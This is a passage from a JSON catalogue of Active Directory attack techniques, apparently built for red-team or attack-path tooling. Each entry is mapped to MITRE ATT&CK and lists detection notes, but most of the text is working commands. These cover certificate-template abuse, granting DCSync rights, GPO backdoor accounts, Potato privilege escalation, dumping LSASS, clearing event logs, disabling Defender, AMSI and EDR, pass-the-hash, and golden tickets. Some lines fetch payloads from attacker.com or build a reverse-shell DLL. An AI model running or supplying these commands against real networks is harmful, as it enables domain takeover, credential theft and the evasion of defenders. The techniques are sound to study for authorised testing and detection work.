        "# Certipy - ESC1: Request certificate as another user",
        "certipy req -u user@domain.local -p 'Password123' -ca YOURCA -template VulnerableTemplate -upn Administrator@domain.local",
        "# Certipy - Authenticate with certificate",
        "certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1",
        "# Certify - Enumerate vulnerable templates",
        "Certify.exe find /vulnerable",
        "# Certify - Request certificate with SAN",
        "Certify.exe request /ca:CA.domain.local\\CA /template:VulnerableTemplate /altname:Administrator",
        "# Certipy - ESC4: Modify template permissions",
        "certipy template -u user@domain.local -p 'Password123' -template VulnerableTemplate -save-old",
        "# Certipy - ESC6: Request certificate for any user (EDITF_ATTRIBUTESUBJECTALTNAME2)",
        "certipy req -u user@domain.local -p 'Password123' -ca YOURCA -template User -upn Administrator@domain.local",
        "# Certipy - ESC8: NTLM relay to AD CS web enrollment",
        "certipy relay -ca CA.domain.local",
        "# ForgeCert - Forge certificate with stolen CA private key",
        "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject \"CN=Administrator\" --SubjectAltName \"Administrator@domain.local\" --NewCertPath admin.pfx",
        "# Rubeus - Request TGT using certificate",
        "Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:CertPassword /ptt",
        "# PassTheCert - Use certificate for LDAP authentication",
        "passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip 192.168.1.1"
      ]
    },
    {
      "id": "AD-PRIVESC-001",
      "mitre_id": "T1484.001",
      "name": "ACL Abuse (WriteDACL/GenericAll)",
      "phase": "privilege_escalation",
      "infrastructure": "ad",
      "description": "Abuse misconfigured ACLs to modify object permissions, reset passwords, or add users to privileged groups",
      "prerequisites": ["WriteDACL, GenericAll, GenericWrite, or similar rights on target object"],
      "tools": ["PowerView Add-DomainObjectAcl", "BloodHound path analysis", "BloodyAD"],
      "detection": "Event 4662 for ACL modifications, 5136 for directory changes",
      "references": ["https://attack.mitre.org/techniques/T1484/001/"],
      "next_techniques": ["AD-CRED-004", "AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# PowerView - Grant DCSync rights to user",
        "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attackeruser -Rights DCSync",
        "# PowerView - Grant GenericAll on user object",
        "Add-DomainObjectAcl -TargetIdentity victimuser -PrincipalIdentity attackeruser -Rights All",
        "# PowerView - Add user to group (if GenericAll on group)",
        "Add-DomainGroupMember -Identity 'Domain Admins' -Members attackeruser",
        "# PowerView - Reset user password (if GenericAll/ResetPassword)",
        "Set-DomainUserPassword -Identity victimuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)",
        "# BloodyAD - Add user to group",
        "bloodyAD -d domain.local -u user -p 'Password123' --host DC01.domain.local add groupMember 'Domain Admins' attackeruser",
        "# BloodyAD - Reset password",
        "bloodyAD -d domain.local -u user -p 'Password123' --host DC01.domain.local set password victimuser 'NewPassword123!'",
        "# Impacket dacledit - Grant DCSync rights",
        "dacledit.py -action write -rights DCSync -principal attackeruser -target-dn 'DC=domain,DC=local' domain.local/user:Password123",
        "# PowerView - Find objects with interesting ACLs",
        "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match 'attackeruser'}",
        "# PowerView - Set SPN on account (for Kerberoasting)",
        "Set-DomainObject -Identity victimuser -Set @{serviceprincipalname='fake/spn'}",
        "# Targeted Kerberoasting after setting SPN",
        "Rubeus.exe kerberoast /user:victimuser /outfile:hash.txt"
      ]
    },
    {
      "id": "AD-PRIVESC-002",
      "mitre_id": "T1484.002",
      "name": "GPO Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "ad",
      "description": "Modify Group Policy Objects to deploy malicious scripts, scheduled tasks, or configuration changes",
      "prerequisites": ["Write access to GPO or GPO link"],
      "tools": ["SharpGPOAbuse", "PowerView", "pyGPOAbuse"],
      "detection": "GPO modification auditing (Event 5136), SYSVOL integrity monitoring",
      "references": ["https://attack.mitre.org/techniques/T1484/002/"],
      "next_techniques": ["AD-EXEC-001", "AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# SharpGPOAbuse - Add local admin via GPO",
        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attackeruser --GPOName \"Default Domain Policy\"",
        "# SharpGPOAbuse - Add startup script",
        "SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents \"net user backdoor Password123! /add\" --GPOName \"Default Domain Policy\"",
        "# SharpGPOAbuse - Create immediate scheduled task",
        "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Updater\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell -ep bypass -c IEX(...)\" --GPOName \"Workstation Policy\"",
        "# SharpGPOAbuse - Add user right (e.g., SeDebugPrivilege)",
        "SharpGPOAbuse.exe --AddUserRights --UserRights \"SeDebugPrivilege\" --UserAccount attackeruser --GPOName \"Default Domain Policy\"",
        "# pyGPOAbuse - Add local admin (Python, from Linux)",
        "pygpoabuse domain.local/user:Password123 -gpo-id \"GPO_GUID\" -localadmin -member attackeruser",
        "# PowerView - Find modifiable GPOs",
        "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}",
        "# PowerView - Get GPOs applied to specific OU",
        "Get-DomainGPO -SearchBase 'OU=Workstations,DC=domain,DC=local'",
        "# Group Policy Management Console (manual)",
        "gpmc.msc",
        "# Force GPO update on target",
        "gpupdate /force"
      ]
    },
    {
      "id": "AD-PRIVESC-003",
      "mitre_id": "T1134.001",
      "name": "Token Impersonation",
      "phase": "privilege_escalation",
      "infrastructure": "ad",
      "description": "Steal or forge access tokens to impersonate other users, often escalating to SYSTEM or domain admin",
      "prerequisites": ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"],
      "tools": ["Mimikatz token::elevate", "Incognito", "Potato family exploits"],
      "detection": "Event 4624 Type 9 logons, anomalous token usage patterns",
      "references": ["https://attack.mitre.org/techniques/T1134/001/"],
      "next_techniques": ["AD-CRED-002", "AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Mimikatz - Elevate to SYSTEM token",
        "mimikatz.exe \"privilege::debug\" \"token::elevate\" exit",
        "# Mimikatz - Elevate to specific user token",
        "mimikatz.exe \"privilege::debug\" \"token::elevate /user:Administrator\" exit",
        "# Mimikatz - List available tokens",
        "mimikatz.exe \"privilege::debug\" \"token::list\" exit",
        "# Incognito (Metasploit) - List available tokens",
        "load incognito; list_tokens -u",
        "# Incognito - Impersonate user token",
        "impersonate_token DOMAIN\\\\Administrator",
        "# PrintSpoofer - SYSTEM from SeImpersonatePrivilege",
        "PrintSpoofer.exe -i -c cmd",
        "# JuicyPotato - SYSTEM from SeImpersonatePrivilege (Windows < Server 2019)",
        "JuicyPotato.exe -l 1337 -p cmd.exe -t *",
        "# RoguePotato - SYSTEM from SeImpersonatePrivilege (Windows Server 2019+)",
        "RoguePotato.exe -r attacker_ip -l 9999 -e \"cmd.exe\"",
        "# GodPotato - SYSTEM from SeImpersonatePrivilege (universal)",
        "GodPotato.exe -cmd \"cmd /c whoami\"",
        "# SweetPotato - SYSTEM from SeImpersonatePrivilege",
        "SweetPotato.exe -p cmd.exe -a \"/c whoami\"",
        "# Check current privileges",
        "whoami /priv"
      ]
    },
    {
      "id": "AD-PRIVESC-004",
      "mitre_id": "T1543.003",
      "name": "Abusing Service Accounts",
      "phase": "privilege_escalation",
      "infrastructure": "ad",
      "description": "Exploit service accounts running as high-privileged users or with excessive permissions",
      "prerequisites": ["Compromised service account credentials"],
      "tools": ["Service enumeration scripts", "CrackMapExec"],
      "detection": "Audit service account usage, monitor for anomalous service behavior",
      "references": ["https://attack.mitre.org/techniques/T1543/003/"],
      "next_techniques": ["AD-LATERAL-001", "AD-CRED-004"],
      "risk_level": "high",
      "commands": [
        "# PowerView - Find service accounts",
        "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof",
        "# PowerView - Find service accounts with admin rights",
        "Get-DomainUser -SPN -AdminCount | Select-Object samaccountname,serviceprincipalname",
        "# CrackMapExec - Enumerate services remotely",
        "crackmapexec smb 192.168.1.100 -u user -p 'Password123' --services",
        "# Query local services for high-privilege accounts",
        "wmic service get name,startname | findstr /i \"admin\\|system\"",
        "# PowerShell - Get services running as domain accounts",
        "Get-WmiObject win32_service | Where-Object {$_.StartName -like '*domain*'} | Select-Object Name,StartName,State",
        "# sc.exe - Query specific service",
        "sc.exe qc ServiceName",
        "# Modify service binary path (if writable)",
        "sc.exe config VulnService binPath= \"C:\\temp\\payload.exe\"",
        "# Replace service binary (if binary is writable)",
        "copy /Y payload.exe \"C:\\Program Files\\VulnService\\service.exe\"",
        "# Restart service to trigger payload",
        "sc.exe stop VulnService && sc.exe start VulnService",
        "# Check for unquoted service paths",
        "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\""
      ]
    },
    {
      "id": "AD-PRIVESC-005",
      "mitre_id": "T1078.002",
      "name": "Shadow Credentials",
      "phase": "privilege_escalation",
      "infrastructure": "ad",
      "description": "Add KeyCredential to msDS-KeyCredentialLink attribute to authenticate as the target user",
      "prerequisites": ["Write access to target's msDS-KeyCredentialLink attribute"],
      "tools": ["Whisker", "Certipy shadow", "pyWhisker"],
      "detection": "Monitor msDS-KeyCredentialLink modifications (Event 5136)",
      "references": ["https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"],
      "next_techniques": ["AD-CRED-002", "AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Whisker - Add shadow credential to target user",
        "Whisker.exe add /target:victimuser",
        "# Whisker - Add shadow credential and specify output file",
        "Whisker.exe add /target:victimuser /path:C:\\temp\\cert.pfx /password:CertPass123",
        "# Whisker - List shadow credentials on target",
        "Whisker.exe list /target:victimuser",
        "# Whisker - Remove shadow credentials",
        "Whisker.exe remove /target:victimuser /deviceid:{DEVICE_GUID}",
        "# pyWhisker - Add shadow credentials (from Linux)",
        "python3 pywhisker.py -d domain.local -u user -p 'Password123' --target victimuser --action add",
        "# Certipy - Shadow credentials attack",
        "certipy shadow auto -u user@domain.local -p 'Password123' -account victimuser",
        "# Rubeus - Request TGT using the certificate from shadow credentials",
        "Rubeus.exe asktgt /user:victimuser /certificate:cert.pfx /password:CertPass123 /ptt",
        "# PassTheCert - Authenticate with certificate",
        "passthecert.py -domain domain.local -dc-ip 192.168.1.1 -crt victimuser.crt -key victimuser.key",
        "# Check if PKINIT is supported (required for shadow credentials)",
        "nslookup -type=srv _kerberos._tcp.pkinit.domain.local"
      ]
    },
    {
      "id": "AD-DEFENSE-001",
      "mitre_id": "T1070.001",
      "name": "Clear Windows Event Logs",
      "phase": "defense_evasion",
      "infrastructure": "ad",
      "description": "Clear security event logs to remove evidence of malicious activity",
      "prerequisites": ["Local administrator or SeSecurityPrivilege"],
      "tools": ["wevtutil", "Clear-EventLog", "Meterpreter clearev"],
      "detection": "Event 1102 (audit log cleared), log forwarding to SIEM",
      "references": ["https://attack.mitre.org/techniques/T1070/001/"],
      "next_techniques": [],
      "risk_level": "medium",
      "commands": [
        "# wevtutil - Clear Security event log",
        "wevtutil cl Security",
        "# wevtutil - Clear all major event logs",
        "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
        "# PowerShell - Clear Security event log",
        "Clear-EventLog -LogName Security",
        "# PowerShell - Clear all event logs",
        "Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }",
        "# PowerShell - Clear specific events (more subtle)",
        "wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /f:text | ForEach-Object {wevtutil delete-event Security /r:$_}",
        "# Meterpreter - Clear event logs",
        "clearev",
        "# Disable Windows Event Log service (temporary)",
        "net stop eventlog",
        "# Modify log settings to limit retention",
        "wevtutil sl Security /ms:0",
        "# Phantom - Suspend EventLog threads instead of clearing",
        "Invoke-Phant0m",
        "# Delete specific log files directly",
        "del C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"
      ]
    },
    {
      "id": "AD-DEFENSE-002",
      "mitre_id": "T1562.001",
      "name": "Disable Security Tools",
      "phase": "defense_evasion",
      "infrastructure": "ad",
      "description": "Disable or tamper with security software including AV, EDR, and logging",
      "prerequisites": ["Local administrator"],
      "tools": ["Various AV/EDR bypass techniques", "Service manipulation"],
      "detection": "Monitor service state changes, tamper protection, agent heartbeat monitoring",
      "references": ["https://attack.mitre.org/techniques/T1562/001/"],
      "next_techniques": ["AD-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Disable Windows Defender real-time protection",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "# Disable Windows Defender completely",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableScriptScanning $true",
        "# Add exclusion path for Windows Defender",
        "Add-MpPreference -ExclusionPath 'C:\\temp'",
        "# Stop Windows Defender service",
        "sc.exe stop WinDefend",
        "# Disable Windows Firewall",
        "netsh advfirewall set allprofiles state off",
        "# Disable AMSI (PowerShell)",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "# Kill EDR processes (requires privileges)",
        "taskkill /F /IM SentinelAgent.exe",
        "# Unload EDR driver using vulnerable driver (BYOVD)",
        "gdrv.exe -kill SentinelAgent.sys",
        "# Disable ETW (Event Tracing for Windows)",
        "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
        "# Terminate AV/EDR via kernel driver exploitation",
        "Terminator.exe -pid <av_process_id>"
      ]
    },
    {
      "id": "AD-DEFENSE-003",
      "mitre_id": "T1218.011",
      "name": "Rundll32 Execution",
      "phase": "defense_evasion",
      "infrastructure": "ad",
      "description": "Use rundll32.exe to execute malicious DLLs, bypassing application whitelisting",
      "prerequisites": ["Malicious DLL on target"],
      "tools": ["rundll32.exe", "Custom DLLs"],
      "detection": "Monitor rundll32 command lines, unusual DLL loads",
      "references": ["https://attack.mitre.org/techniques/T1218/011/"],
      "next_techniques": ["AD-CRED-002"],
      "risk_level": "medium",
      "commands": [
        "# Execute exported function from DLL",
        "rundll32.exe payload.dll,EntryPoint",
        "# Execute DLL from network share",
        "rundll32.exe \\\\attacker.com\\share\\payload.dll,DllMain",
        "# Execute JavaScript via rundll32",
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(...)\")",
        "# Execute VBScript via rundll32",
        "rundll32.exe vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(googlewas,\"\")&CreateObject(\"WScript.Shell\").Run(\"calc.exe\")",
        "# DLL execution via comsvcs.dll for LSASS dump",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full",
        "# Shell32.dll ShellExec_RunDLL",
        "rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe",
        "# Execute Control Panel item",
        "rundll32.exe shell32.dll,Control_RunDLL payload.cpl",
        "# advpack.dll RegisterOCX",
        "rundll32.exe advpack.dll,RegisterOCX payload.dll",
        "# ieadvpack.dll RegisterOCX",
        "rundll32.exe ieadvpack.dll,RegisterOCX payload.dll",
        "# Generate DLL payload with msfvenom",
        "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f dll -o payload.dll"
      ]
    },
    {
      "id": "AD-DISC-001",
      "mitre_id": "T1087.002",
      "name": "Domain Account Discovery",
      "phase": "discovery",
      "infrastructure": "ad",
      "description": "Enumerate domain accounts, groups, and organizational units for privilege escalation targets",
      "prerequisites": ["Valid domain credentials"],
      "tools": ["net user /domain", "PowerView", "ADFind"],
      "detection": "Unusual LDAP queries, SAMR enumeration from non-admin systems",
      "references": ["https://attack.mitre.org/techniques/T1087/002/"],
      "next_techniques": ["AD-CRED-001", "AD-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# net.exe - List all domain users",
        "net user /domain",
        "# net.exe - Get details on specific user",
        "net user Administrator /domain",
        "# net.exe - List domain groups",
        "net group /domain",
        "# net.exe - List Domain Admins",
        "net group \"Domain Admins\" /domain",
        "# PowerView - Get all domain users with details",
        "Get-DomainUser | Select-Object samaccountname,description,memberof,lastlogon",
        "# PowerView - Find users with admin count flag",
        "Get-DomainUser -AdminCount | Select-Object samaccountname",
        "# PowerView - Find disabled accounts",
        "Get-DomainUser -UACFilter ACCOUNTDISABLE",
        "# PowerView - Find accounts with password never expires",
        "Get-DomainUser -UACFilter DONT_EXPIRE_PASSWD",
        "# ADFind - Enumerate all users",
        "adfind.exe -f \"(objectClass=user)\" sAMAccountName description memberOf",
        "# WMIC - List domain users",
        "wmic useraccount get name,sid,status",
        "# CrackMapExec - Enumerate users",
        "crackmapexec smb DC01.domain.local -u user -p 'Password123' --users"
      ]
    },
    {
      "id": "AD-DISC-002",
      "mitre_id": "T1069.002",
      "name": "Domain Group Discovery",
      "phase": "discovery",
      "infrastructure": "ad",
      "description": "Enumerate domain groups, especially privileged groups like Domain Admins and Enterprise Admins",
      "prerequisites": ["Valid domain credentials"],
      "tools": ["net group /domain", "PowerView Get-DomainGroup", "BloodHound"],
      "detection": "Monitor for enumeration of sensitive groups",
      "references": ["https://attack.mitre.org/techniques/T1069/002/"],
      "next_techniques": ["AD-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# net.exe - List all domain groups",
        "net group /domain",
        "# net.exe - List members of Domain Admins",
        "net group \"Domain Admins\" /domain",
        "# net.exe - List members of Enterprise Admins",
        "net group \"Enterprise Admins\" /domain",
        "# PowerView - Get all domain groups",
        "Get-DomainGroup | Select-Object samaccountname,description",
        "# PowerView - Get members of specific group",
        "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
        "# PowerView - Find groups with AdminCount",
        "Get-DomainGroup -AdminCount",
        "# PowerView - Get nested group memberships",
        "Get-DomainGroup -Identity 'Domain Admins' | Get-DomainGroupMember -Recurse",
        "# ADFind - Enumerate groups",
        "adfind.exe -f \"(&(objectClass=group)(admincount=1))\" name member",
        "# dsquery - List all groups",
        "dsquery group -limit 0",
        "# PowerShell AD Module - Get privileged groups",
        "Get-ADGroup -Filter {adminCount -eq 1} | Get-ADGroupMember",
        "# CrackMapExec - Enumerate groups",
        "crackmapexec smb DC01.domain.local -u user -p 'Password123' --groups"
      ]
    },
    {
      "id": "AD-LATERAL-001",
      "mitre_id": "T1550.002",
      "name": "Pass-the-Hash",
      "phase": "lateral_movement",
      "infrastructure": "ad",
      "description": "Use captured NTLM hashes to authenticate to other systems without knowing the password",
      "prerequisites": ["NTLM hash of target account"],
      "tools": ["Mimikatz sekurlsa::pth", "Impacket psexec/wmiexec", "CrackMapExec"],
      "detection": "Event 4624 Type 3 with NTLM, anomalous authentication patterns",
      "references": ["https://attack.mitre.org/techniques/T1550/002/"],
      "next_techniques": ["AD-CRED-002", "AD-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Mimikatz - Pass-the-Hash to spawn new process",
        "mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe\" exit",
        "# Impacket psexec - Remote shell with hash",
        "psexec.py domain.local/Administrator@192.168.1.100 -hashes :NTLM_HASH",
        "# Impacket wmiexec - Remote shell via WMI",
        "wmiexec.py domain.local/Administrator@192.168.1.100 -hashes :NTLM_HASH",
        "# Impacket smbexec - Remote shell via SMB",
        "smbexec.py domain.local/Administrator@192.168.1.100 -hashes :NTLM_HASH",
        "# Impacket atexec - Execute command via scheduled task",
        "atexec.py domain.local/Administrator@192.168.1.100 -hashes :NTLM_HASH 'whoami'",
        "# CrackMapExec - Verify hash works across multiple hosts",
        "crackmapexec smb targets.txt -u Administrator -H NTLM_HASH",
        "# CrackMapExec - Execute command with PTH",
        "crackmapexec smb 192.168.1.100 -u Administrator -H NTLM_HASH -x 'whoami'",
        "# CrackMapExec - Dump SAM with PTH",
        "crackmapexec smb 192.168.1.100 -u Administrator -H NTLM_HASH --sam",
        "# Evil-WinRM - PTH for WinRM",
        "evil-winrm -i 192.168.1.100 -u Administrator -H NTLM_HASH",
        "# xfreerdp - RDP with PTH (restricted admin mode required)",
        "xfreerdp /v:192.168.1.100 /u:Administrator /pth:NTLM_HASH"
      ]
    },
    {
      "id": "AD-LATERAL-002",
      "mitre_id": "T1550.003",
      "name": "Pass-the-Ticket",
      "phase": "lateral_movement",
      "infrastructure": "ad",
      "description": "Use stolen Kerberos tickets (TGT or TGS) to authenticate to other services",
      "prerequisites": ["Stolen Kerberos ticket"],
      "tools": ["Mimikatz kerberos::ptt", "Rubeus ptt", "Impacket"],
      "detection": "Anomalous ticket usage, ticket reuse from different IPs",
      "references": ["https://attack.mitre.org/techniques/T1550/003/"],
      "next_techniques": ["AD-CRED-002", "AD-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Mimikatz - Export Kerberos tickets from memory",
        "mimikatz.exe \"sekurlsa::tickets /export\" exit",
        "# Mimikatz - Import and use ticket (Pass-the-Ticket)",
        "mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit",
        "# Rubeus - Dump all tickets",
        "Rubeus.exe dump",
        "# Rubeus - Import ticket",
        "Rubeus.exe ptt /ticket:ticket.kirbi",
        "# Rubeus - Request TGT for current user",
        "Rubeus.exe tgtdeleg",
        "# Rubeus - Request TGT with credentials",
        "Rubeus.exe asktgt /user:user /password:Password123 /ptt",
        "# Impacket - Convert kirbi to ccache format",
        "ticketConverter.py ticket.kirbi ticket.ccache",
        "# Set ticket for Impacket tools",
        "export KRB5CCNAME=ticket.ccache",
        "# Impacket psexec with Kerberos ticket",
        "psexec.py -k -no-pass domain.local/Administrator@DC01.domain.local",
        "# Impacket secretsdump with Kerberos ticket",
        "secretsdump.py -k -no-pass domain.local/Administrator@DC01.domain.local",
        "# List current cached tickets",
        "klist"
      ]
    },
    {
      "id": "AD-LATERAL-003",
      "mitre_id": "T1021.006",
      "name": "WinRM Lateral Movement",
      "phase": "lateral_movement",
      "infrastructure": "ad",
      "description": "Use Windows Remote Management for lateral movement and remote command execution",
      "prerequisites": ["Valid credentials", "WinRM enabled on target"],
      "tools": ["Enter-PSSession", "Invoke-Command", "Evil-WinRM"],
      "detection": "Event 4624 Type 3, WinRM service logging, Event 91/168",
      "references": ["https://attack.mitre.org/techniques/T1021/006/"],
      "next_techniques": ["AD-CRED-002", "AD-EXEC-001"],
      "risk_level": "medium",
      "commands": [
        "# PowerShell - Enter interactive PSSession",
        "Enter-PSSession -ComputerName server.domain.local -Credential domain\\user",
        "# PowerShell - Execute command remotely",
        "Invoke-Command -ComputerName server.domain.local -Credential domain\\user -ScriptBlock {whoami}",
        "# PowerShell - Execute on multiple hosts",
        "Invoke-Command -ComputerName server1,server2,server3 -Credential domain\\user -ScriptBlock {Get-Process}",
        "# PowerShell - Execute script file remotely",
        "Invoke-Command -ComputerName server.domain.local -Credential domain\\user -FilePath C:\\scripts\\payload.ps1",
        "# Evil-WinRM - Interactive shell with password",
        "evil-winrm -i server.domain.local -u user -p 'Password123'",
        "# Evil-WinRM - Interactive shell with hash",
        "evil-winrm -i server.domain.local -u user -H NTLM_HASH",
        "# Evil-WinRM - Upload and download files",
        "upload /local/path/file.exe C:\\remote\\path\\file.exe; download C:\\remote\\file.txt /local/file.txt",
        "# winrs - Native Windows Remote Shell",
        "winrs -r:server.domain.local -u:domain\\user -p:Password123 cmd.exe",
        "# CrackMapExec - WinRM execution",
        "crackmapexec winrm 192.168.1.100 -u user -p 'Password123' -x 'whoami'",
        "# Test WinRM connectivity",
        "Test-WSMan -ComputerName server.domain.local"
      ]
    },
    {
      "id": "AD-LATERAL-004",
      "mitre_id": "T1021.003",
      "name": "DCOM Lateral Movement",
      "phase": "lateral_movement",
      "infrastructure": "ad",
      "description": "Abuse DCOM objects for lateral movement and remote code execution",
      "prerequisites": ["Local administrator on target", "DCOM enabled"],
      "tools": ["Impacket dcomexec.py", "MMC20.Application", "ShellBrowserWindow"],
      "detection": "DCOM traffic analysis, unusual parent-child process relationships",
      "references": ["https://attack.mitre.org/techniques/T1021/003/"],
      "next_techniques": ["AD-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Impacket dcomexec - Execute via DCOM MMC20",
        "dcomexec.py domain.local/Administrator:'Password123'@192.168.1.100 'whoami'",
        "# Impacket dcomexec - Use hash authentication",
        "dcomexec.py domain.local/Administrator@192.168.1.100 -hashes :NTLM_HASH 'whoami'",
        "# Impacket dcomexec - Specify DCOM object",
        "dcomexec.py -object MMC20 domain.local/Administrator:'Password123'@192.168.1.100",
        "# PowerShell - MMC20.Application lateral movement",
        "$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','192.168.1.100')); $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc.exe','7')",
        "# PowerShell - ShellBrowserWindow lateral movement",
        "$com = [activator]::CreateInstance([type]::GetTypeFromProgID('ShellBrowserWindow','192.168.1.100')); $com.Document.Application.ShellExecute('cmd.exe','/c calc.exe','C:\\Windows\\System32',$null,0)",
        "# PowerShell - Excel.Application lateral movement",
        "$com = [activator]::CreateInstance([type]::GetTypeFromProgID('Excel.Application','192.168.1.100')); $com.DisplayAlerts = $false; $com.DDEInitiate('cmd','/c calc.exe')",
        "# PowerShell - Outlook.Application lateral movement",
        "$com = [activator]::CreateInstance([type]::GetTypeFromProgID('Outlook.Application','192.168.1.100')); $com.CreateObject('WScript.Shell').Run('calc.exe')",
        "# CrackMapExec - DCOM execution",
        "crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' --exec-method mmcexec -x 'whoami'"
      ]
    },
    {
      "id": "AD-LATERAL-005",
      "mitre_id": "T1482",
      "name": "Cross-Domain/Forest Movement",
      "phase": "lateral_movement",
      "infrastructure": "ad",
      "description": "Move laterally across domain or forest trusts using trust relationships",
      "prerequisites": ["Compromised account in trusted domain", "Trust relationship"],
      "tools": ["Mimikatz inter-realm TGT", "Impacket raiseChild.py"],
      "detection": "Monitor cross-domain authentication, SID history abuse",
      "references": ["https://attack.mitre.org/techniques/T1482/"],
      "next_techniques": ["AD-CRED-004"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - Create inter-realm TGT (Parent-Child trust)",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /sids:ENTERPRISE_ADMINS_SID /krbtgt:CHILD_KRBTGT_HASH /ptt\" exit",
        "# Impacket raiseChild - Escalate from child to parent domain",
        "raiseChild.py child.domain.local/Administrator:Password123 -target-exec DC01.domain.local",
        "# Mimikatz - Forge trust ticket",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID /target:domain.local /rc4:TRUST_KEY /service:krbtgt /ptt\" exit",
        "# PowerView - Get trust keys from DC",
        "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'",
        "# Mimikatz - Extract trust keys",
        "mimikatz.exe \"lsadump::trust /patch\" exit",
        "# Rubeus - Request cross-domain TGS",
        "Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/DC01.domain.local /dc:DC01.domain.local /ptt",
        "# Abuse SID History for cross-domain access",
        "mimikatz.exe \"kerberos::golden /user:fakeuser /domain:child.domain.local /sid:CHILD_SID /sids:S-1-5-21-PARENT-512 /krbtgt:KRBTGT_HASH /ptt\" exit",
        "# PowerView - Enumerate foreign group members",
        "Get-DomainForeignGroupMember -Domain domain.local",
        "# PowerView - Find users with SID history",
        "Get-DomainUser -LDAPFilter '(sidHistory=*)'"
      ]
    },
    {
      "id": "AD-PERSIST-001",
      "mitre_id": "T1558.001",
      "name": "Golden Ticket Persistence",
      "phase": "persistence",
      "infrastructure": "ad",
      "description": "Create Golden Tickets using KRBTGT hash for long-term persistent access to the domain",
      "prerequisites": ["KRBTGT hash"],
      "tools": ["Mimikatz kerberos::golden", "Impacket ticketer.py"],
      "detection": "Monitor for anomalous TGTs, ticket lifetime anomalies",
      "references": ["https://attack.mitre.org/techniques/T1558/001/"],
      "next_techniques": ["AD-LATERAL-001"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - Create Golden Ticket with long lifetime (10 years)",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit",
        "# Mimikatz - Golden Ticket with specific PAC (extra SIDs)",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_HASH /sids:S-1-5-21-YYYYYYYY-519 /ptt\" exit",
        "# Impacket - Create Golden Ticket",
        "ticketer.py -domain domain.local -domain-sid S-1-5-21-XXXXXXXXXX -nthash KRBTGT_HASH -duration 3650 Administrator",
        "# Rubeus - Create Golden Ticket",
        "Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /rc4:KRBTGT_HASH /ptt",
        "# Store ticket to file for later use",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_HASH /ticket:golden.kirbi\" exit",
        "# Verify Golden Ticket works",
